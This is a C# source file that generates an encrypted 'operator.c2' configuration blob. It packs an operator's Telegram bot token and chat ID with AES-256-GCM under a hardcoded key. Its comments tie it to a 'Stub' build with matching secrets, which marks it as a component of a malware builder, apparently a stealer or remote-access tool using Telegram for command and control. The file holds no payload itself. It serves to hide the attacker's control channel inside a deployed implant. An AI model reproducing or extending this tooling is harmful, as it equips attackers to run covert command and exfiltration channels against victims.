// gen_c2.cs — standalone generator for operator.c2 (AES-256-GCM blob)
// Compiles with: csc gen_c2.cs
// Usage: gen_c2.exe <bot_token> <chat_id> [output_path]
//
// Reads the C2Key from Stub\ns0\BuildSecrets.cs at runtime by
// compiling BuildSecrets.cs into the same assembly is overkill;
// instead we embed the key directly to avoid coupling.

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace C2Gen
{
    internal static class AesGcmNative
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public uint cbSize;
            public uint dwInfoVersion;
            public IntPtr pbNonce;
            public uint cbNonce;
            public IntPtr pbAuthData;
            public uint cbAuthData;
            public IntPtr pbTag;
            public uint cbTag;
            public IntPtr pbMacContext;
            public uint cbMacContext;
            public uint cbAAD;
            public ulong cbData;
            public uint dwFlags;
        }

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        private static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptGetProperty(IntPtr hObject, string pszProperty, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, byte[] pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptEncrypt(IntPtr hKey, byte[] pbInput, uint cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        private static IntPtr OpenGcm(byte[] key)
        {
            IntPtr hAlg;
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0)
                throw new InvalidOperationException("BCryptOpenAlgorithmProvider failed");

            byte[] modeValue = Encoding.Unicode.GetBytes("GCM\0");
            if (BCryptSetProperty(hAlg, "ChainingMode", modeValue, (uint)modeValue.Length, 0) != 0)
                throw new InvalidOperationException("BCryptSetProperty ChainingMode failed");

            uint objLen;
            BCryptGetProperty(hAlg, "ObjectLength", null, 0, out objLen, 0);
            byte[] keyObject = new byte[objLen];

            IntPtr hKey;
            if (BCryptGenerateSymmetricKey(hAlg, out hKey, keyObject, objLen, key, (uint)key.Length, 0) != 0)
                throw new InvalidOperationException("BCryptGenerateSymmetricKey failed");

            BCryptCloseAlgorithmProvider(hAlg, 0);
            return hKey;
        }

        public static void Encrypt(byte[] key, byte[] nonce, byte[] plain, out byte[] ciphertext, out byte[] tag)
        {
            IntPtr hKey = OpenGcm(key);
            try
            {
                byte[] localTag = new byte[16];
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = MakeInfo(nonce, localTag);
                try
                {
                    byte[] output = new byte[plain.Length];
                    uint written;
                    uint status = BCryptEncrypt(hKey, plain, (uint)plain.Length, ref info,
                        null, 0, output, (uint)output.Length, out written, 0);
                    if (status != 0)
                        throw new System.Security.Cryptography.CryptographicException("AES-GCM encrypt failed: " + status);
                    Array.Resize(ref output, (int)written);
                    ciphertext = output;
                }
                finally { FreeInfo(ref info); }
                Marshal.Copy(info.pbTag, localTag, 0, 16);
                tag = localTag;
            }
            finally { BCryptDestroyKey(hKey); }
        }

        private static BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO MakeInfo(byte[] nonce, byte[] tag)
        {
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            info.dwInfoVersion = 1;
            info.cbNonce = (uint)nonce.Length;
            info.pbNonce = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, info.pbNonce, nonce.Length);
            info.cbTag = (uint)tag.Length;
            info.pbTag = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, info.pbTag, tag.Length);
            return info;
        }

        private static void FreeInfo(ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info)
        {
            if (info.pbNonce != IntPtr.Zero) { Marshal.FreeHGlobal(info.pbNonce); info.pbNonce = IntPtr.Zero; }
            if (info.pbTag != IntPtr.Zero) { Marshal.FreeHGlobal(info.pbTag); info.pbTag = IntPtr.Zero; }
        }
    }

    internal static class Program
    {
        // C2Key from BuildSecrets.cs — must match exactly
        private static readonly byte[] C2Key = new byte[32]
        {
            0x9E, 0x22, 0x4B, 0xC7, 0x68, 0xF1, 0x03, 0xAD,
            0x75, 0x18, 0xE4, 0x90, 0x3C, 0xB6, 0x52, 0xDF,
            0x11, 0x8A, 0x6D, 0x27, 0xCC, 0x49, 0xF8, 0x0E,
            0xBB, 0x34, 0x71, 0xA5, 0x5E, 0x96, 0x2F, 0x83
        };

        private static string ReadInput(string prompt)
        {
            Console.Write(prompt);
            return Console.ReadLine()?.Trim() ?? "";
        }

        private static int Main(string[] args)
        {
            string botToken, chatId, outputPath;

            if (args.Length >= 2)
            {
                botToken = args[0];
                chatId = args[1];
                outputPath = args.Length >= 3 ? args[2] : "operator.c2";
            }
            else if (args.Length == 1)
            {
                Console.WriteLine("=== C2 Config Generator ===");
                Console.WriteLine();
                botToken = ReadInput("  Bot token: ");
                chatId = ReadInput("  Chat ID:   ");
                outputPath = args[0];
            }
            else
            {
                Console.WriteLine("=== C2 Config Generator ===");
                Console.WriteLine();
                botToken = ReadInput("  Bot token: ");
                chatId = ReadInput("  Chat ID:   ");
                Console.WriteLine();
                outputPath = ReadInput("  Output path (Enter for operator.c2): ");
                if (string.IsNullOrEmpty(outputPath))
                    outputPath = "operator.c2";
            }

            if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId))
            {
                Console.Error.WriteLine("[!] Bot token and chat ID are required.");
                return 1;
            }

            string plaintext = $"bot_token={botToken}\r\nchat_id={chatId}\r\n";
            byte[] plainBytes = Encoding.UTF8.GetBytes(plaintext);

            byte[] nonce = new byte[12];
            using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create())
            {
                rng.GetBytes(nonce);
            }

            byte[] ciphertext, tag;
            AesGcmNative.Encrypt(C2Key, nonce, plainBytes, out ciphertext, out tag);

            byte[] blob = new byte[12 + 16 + ciphertext.Length];
            Buffer.BlockCopy(nonce, 0, blob, 0, 12);
            Buffer.BlockCopy(tag, 0, blob, 12, 16);
            Buffer.BlockCopy(ciphertext, 0, blob, 28, ciphertext.Length);

            File.WriteAllBytes(outputPath, blob);

            Console.WriteLine($"[+] Generated {outputPath} ({blob.Length} bytes)");
            Console.WriteLine($"    plaintext: {plaintext.TrimEnd()}");
            Console.WriteLine($"    nonce:     {BitConverter.ToString(nonce)}");
            Console.WriteLine($"    tag:       {BitConverter.ToString(tag)}");
            return 0;
        }
    }
}